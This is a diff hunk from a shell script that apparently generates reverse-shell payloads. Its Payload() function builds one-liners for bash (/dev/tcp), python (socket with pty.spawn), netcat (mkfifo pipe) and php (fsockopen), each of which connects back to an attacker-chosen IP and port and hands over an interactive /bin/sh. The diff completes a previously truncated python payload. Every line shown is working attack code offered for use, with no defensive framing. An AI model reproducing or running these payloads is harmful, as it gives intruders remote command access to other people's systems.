@@ -71,7 +71,7 @@ done
 Payload(){
 	[ "$INTERFACE" != False ] && IP="$(ifconfig $INTERFACE 2>/dev/null | grep netmask | awk '{print $2}')"
 	[ "$TYPE" == "bash" ] && PAYLOAD="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
-	[ "$TYPE" == "python" ] && PAYLOAD="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));o"
+	[ "$TYPE" == "python" ] && PAYLOAD="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
 	[ "$TYPE" == "netcat" ] && PAYLOAD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
 	[ "$TYPE" == "php" ] && PAYLOAD="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
